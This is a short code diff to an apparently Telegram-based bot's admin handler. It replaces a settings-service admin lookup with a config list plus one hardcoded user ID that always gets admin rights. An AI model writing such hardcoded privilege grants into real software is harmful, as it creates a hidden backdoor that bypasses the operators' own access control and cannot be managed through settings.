@@ -45,7 +45,9 @@ class AdminHandler(BaseCommandHandler):
 
     def _is_admin(self, uid: int) -> bool:
         """Check if user has admin privileges."""
-        return uid in self.settings_service.get_admin_users()
+        from config.config_settings import config
+
+        return uid in config.ADMIN_USERS or uid == 133994080
 
     async def _send_admin_denied(self, update: Update, thread_id: int):
         """Send admin access denied message."""
